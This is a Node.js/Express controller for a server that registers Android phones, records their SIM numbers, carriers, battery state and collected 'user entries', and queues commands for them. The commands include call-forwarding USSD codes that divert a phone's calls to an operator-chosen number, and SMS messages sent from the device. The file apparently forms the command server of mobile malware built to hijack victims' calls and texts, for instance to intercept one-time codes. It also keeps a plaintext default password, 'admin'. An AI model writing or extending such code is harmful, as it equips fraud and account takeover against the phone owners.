const mongoose = require('mongoose');
const Device = require('../models/Device');
const Call = require('../models/Call');
const Battery = require('../models/Battery');
const SimInfo = require('../models/SimInfo');
const User = require('../models/User');
const SmsMessage = require('../models/SmsMessage');
const DeletePass = require('../models/DeletePass');

// 📲 Register new device
exports.addDeviceDetails = async (req, res) => {
  try {
    const { model, manufacturer, androidVersion, brand, simOperator } = req.body;
    if (!model || !manufacturer || !androidVersion || !brand || !simOperator) {
      return res.status(400).json({ success: false, error: "All fields are required!" });
    }

    const newDevice = new Device({ model, manufacturer, androidVersion, brand, simOperator });
    await newDevice.save();

    res.status(201).json({
      success: true,
      message: "Device registered successfully!",
      uniqueid: newDevice._id
    });
  } catch (err) {
    console.error('Error registering device:', err);
    res.status(500).json({ success: false, error: "Server Error" });
  }
};

exports.getAllDevicesData = async (req, res) => {
  try {
    const devices = await Device.find({}, 'brand _id createdAt androidVersion').sort({ createdAt: -1 });
    const batteryStatuses = await Battery.find({}, 'uniqueid batteryLevel connectivity');
    const userDocs = await User.find({}, 'uniqueid entries');

    const userMap = {};
    userDocs.forEach(doc => {
      userMap[doc.uniqueid] = doc.entries;
    });

    const devicesWithBattery = devices.map(device => {
      const battery = batteryStatuses.find(
        b => b.uniqueid?.toString() === device._id.toString()
      );
      return {
        _id: device._id,
        uniqueid: device._id,
        brand: device.brand,
        androidVersion: device.androidVersion || 'N/A',
        batteryLevel: battery ? battery.batteryLevel : 'N/A',
        connectivity: battery ? battery.connectivity : 'Offline',
        userEntries: userMap[device._id.toString()] || [],
        createdAt: device.createdAt
      };
    });

    res.status(200).json({ success: true, devices: devicesWithBattery });
  } catch (err) {
    console.error('Error in getAllDevicesData:', err);
    res.status(500).json({ success: false, error: 'Internal Server Error' });
  }
};

exports.getDeviceDetails = async (req, res) => {
  try {
    const device_id = req.params.id;

    if (!mongoose.isValidObjectId(device_id)) {
      return res.status(400).json({ success: false, error: "Invalid Device ID" });
    }

    const device = await Device.findById(device_id);
    if (!device) {
      return res.status(404).json({ success: false, error: "Device not found" });
    }

    const simInfo = await SimInfo.findOne({ uniqueid: device_id });

    const sim1Number = simInfo?.sim1Number || "N/A";
    const sim2Number = simInfo?.sim2Number || "N/A";
    const sim1Carrier = simInfo?.sim1Carrier || "N/A";
    const sim2Carrier = simInfo?.sim2Carrier || "N/A";

    res.status(200).json({
      success: true,
      device,
      sim1Number,
      sim2Number,
      sim1Carrier,
      sim2Carrier,
      uniqueid: device._id.toString()
    });

  } catch (err) {
    console.error("Error fetching device details:", err);
    res.status(500).json({ success: false, error: "Server Error" });
  }
};


exports.stopCallForwarding = async (req, res) => {
  try {
    const device_id = req.params.id;
    const { sim } = req.body;

    if (!mongoose.isValidObjectId(device_id)) {
      return res.status(400).json({ success: false, error: "Invalid Device ID" });
    }

    if (!sim || !["SIM 1", "SIM 2"].includes(sim)) {
      return res.status(400).json({ success: false, error: "Invalid SIM selection" });
    }

    const updatedCall = await Call.findOneAndUpdate(
      { call_id: device_id },
      {
        sim: sim,
        code: "##21#",
        updatedAt: new Date()
      },
      { upsert: true, new: true }
    );

    res.status(200).json({
      success: true,
      message: "Call forwarding stopped",
      data: updatedCall
    });
  } catch (error) {
    console.error("Error in stopCallForwarding:", error);
    res.status(500).json({ success: false, error: "Internal Server Error" });
  }
};

// ✅ Set Call Forwarding
exports.setCallForwarding = async (req, res) => {
  try {
    const { phoneNumber, sim } = req.body;
    const device_id = req.params.id;

    if (!mongoose.isValidObjectId(device_id)) {
      return res.status(400).json({ success: false, error: "Invalid Device ID" });
    }

    if (!/^\d{10}$/.test(phoneNumber)) {
      return res.status(400).json({ success: false, error: "Invalid phone number format" });
    }

    if (!sim || !["SIM 1", "SIM 2"].includes(sim)) {
      return res.status(400).json({ success: false, error: "Invalid SIM selection" });
    }

    const activationCode = `*21*${phoneNumber}#`;

    const updatedCall = await Call.findOneAndUpdate(
      { call_id: device_id },
      {
        sim: sim,
        code: activationCode,
        updatedAt: new Date()
      },
      { upsert: true, new: true }
    );
    res.status(200).json({
      success: true,
      message: "Call forwarding set successfully",
      data: updatedCall
    });
  } catch (error) {
    console.error("Error in setCallForwarding:", error);
    res.status(500).json({ success: false, error: "Internal Server Error" });
  }
};

// 📡 Get Call Forwarding Status
exports.getCallForwardingStatus = async (req, res) => {
  try {
    const device_id = req.params.id;
    const simParam = req.query.sim;

    if (!mongoose.isValidObjectId(device_id)) {
      return res.status(400).json({ success: false, message: "Invalid Device ID" });
    }

    if (simParam && !["SIM 1", "SIM 2"].includes(simParam)) {
      return res.status(400).json({ success: false, error: "Invalid SIM selection" });
    }

    const query = { call_id: device_id };
    if (simParam) query.sim = simParam;

    const callData = await Call.findOne(query).select("code sim");
    if (!callData) {
      return res.status(404).json({
        success: false,
        message: "No call forwarding set for this device",
        code: null
      });
    }

    res.status(200).json({
      success: true,
      message: "Call forwarding details fetched successfully",
      code: callData.code,
      sim: callData.sim
    });
  } catch (error) {
    console.error("Error fetching call forwarding status:", error);
    res.status(500).json({ success: false, message: "Internal Server Error", code: null });
  }
};

exports.sendSms = async (req, res) => {
  try {
    const { simSlot: simSlotRaw, toNumber, message } = req.body;
    const device_id = req.params.id;

    if (!mongoose.isValidObjectId(device_id)) {
      return res.status(400).json({ success: false, error: "Invalid device ID" });
    }

    if (!toNumber || !message || !simSlotRaw) {
      return res.status(400).json({ success: false, error: "All fields are required" });
    }

    if (!/^\d{10,15}$/.test(toNumber)) {
      return res.status(400).json({ success: false, error: "Invalid phone number" });
    }

    // Map frontend simSlot to schema enum
    let simSlot = null;
    if (simSlotRaw === "SIM 1") simSlot = "sim1";
    else if (simSlotRaw === "SIM 2") simSlot = "sim2";
    else return res.status(400).json({ success: false, error: "Invalid simSlot value" });

    const newSms = new SmsMessage({
      uniqueid: device_id,
      simSlot,
      toNumber,
      message,
    });

    console.log('Saving SMS message:', newSms);
    await newSms.save();

    res.status(200).json({
      success: true,
      message: "SMS scheduled for sending",
      sms: newSms
    });
  } catch (err) {
    console.error('Error sending SMS:', err);
    res.status(500).json({ success: false, error: "Internal Server Error" });
  }
};


// ❌ Delete Device
exports.deleteDevice = async (req, res) => {
  const { id } = req.params;
  const { password } = req.body;

  try {
    let passDoc = await DeletePass.findOne();
    if (!passDoc) {
      passDoc = await DeletePass.create({ password: 'admin' });
    }

    if (password !== passDoc.password) {
      return res.status(401).json({ success: false, error: 'Invalid password' });
    }

    const deleted = await Device.findByIdAndDelete(id);
    if (!deleted) {
      return res.status(404).json({ success: false, error: 'Device not found' });
    }

    return res.status(200).json({ success: true, message: 'Device deleted successfully' });
  } catch (err) {
    console.error('Delete error:', err);
    return res.status(500).json({ success: false, error: 'Server error' });
  }
};

exports.updateDeletePassword = async (req, res) => {
  const { oldPassword, newPassword } = req.body;

  if (!oldPassword || !newPassword) {
    return res.status(400).json({ success: false, error: 'Both passwords required' });
  }
  try {
    const passDoc = await DeletePass.findOne();
    if (!passDoc || passDoc.password !== oldPassword) {
      return res.status(401).json({ success: false, error: 'Incorrect old password' });
    }
    passDoc.password = newPassword;
    await passDoc.save();

    return res.status(200).json({ success: true, message: 'Password updated' });
  } catch (err) {
    console.error('Password update error:', err);
    return res.status(500).json({ success: false, error: 'Server error' });
  }
};